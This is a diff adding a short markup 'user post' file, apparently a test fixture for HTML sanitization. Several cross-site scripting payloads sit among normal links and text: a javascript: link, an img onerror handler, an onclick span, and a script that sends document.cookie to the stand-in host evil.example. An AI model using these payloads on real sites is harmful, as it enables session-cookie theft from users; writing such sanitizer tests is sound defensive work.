@@ -1,0 +1,12 @@
+= User post
+
+Normal content with a [safe link](https://example.com), a [mail link](mailto:team@example.com) and a [script link](javascript:alert(document.cookie)).
+
+```=html
+<script>document.location='https://evil.example/?c='+document.cookie</script>
+<img src="x" onerror="alert('xss')">
+```
+
+An inline raw span: `<b onclick="alert(1)">click me</b>`{=html}.
+
+More normal content.
